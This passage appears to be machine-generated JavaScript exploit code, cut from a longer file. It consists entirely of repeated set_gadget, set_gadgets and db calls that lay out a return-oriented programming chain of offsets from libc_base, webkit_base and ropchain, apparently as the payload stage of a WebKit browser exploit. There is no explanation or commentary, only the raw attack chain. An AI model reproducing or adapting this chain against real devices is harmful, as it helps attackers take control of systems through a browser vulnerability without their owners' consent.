]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+114888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+114904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+115048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+115016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+115032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+115120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+115176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+115256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([27, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+115360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+115376, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+115464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+115520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+115592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+115648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+115736, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+115840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+115856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+116000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+115968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+115984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+116072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+116128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+116208, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([3, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+116312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+116328, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+116416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+116472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+116576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+116680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+116696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+116840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+116808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+116824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+116912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+116968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+117048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([28, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+117152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+117168, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+117256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+117312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+117384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+117440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+1026352, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+117576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+117680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+117696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+117840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+117808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+117824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+117912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+117968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+118048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([29, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+118152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+118168, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+118256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+118312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+118384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+118440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+118576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+118680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+118696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+118840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+118808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+118824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+118912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+118968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+119048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([30, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+119152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+119168, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+119256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+119312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+119384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+119440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+119528, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+119632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+119648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+119792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+119760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+119776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+119864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+119920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+120000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([7, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+120104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+120120, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+120208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+120264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+120368, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+120472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+120488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+120632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+120600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+120616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+120704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+120760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+120840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([31, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+120944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+120960, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+121048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+121104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+121176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+121232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+788575, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+121368, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+121472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+121488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+121632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+121600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+121616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+121704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+121760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+121840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+121944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+121960, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+122048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+122104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+122176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+122232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+122320, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+122424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+122440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+122584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+122552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+122568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+122656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+122712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+122792, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([37, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+122896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+122912, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+123000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+123056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+123160, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+123264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+123280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+123424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+123392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+123408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+123496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+123552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+123632, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([33, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+123736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+123752, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+123840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+123896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+123968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+124024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+471355, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+124160, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+124264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+124280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+124424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+124392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+124408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+124496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+124552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+124632, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
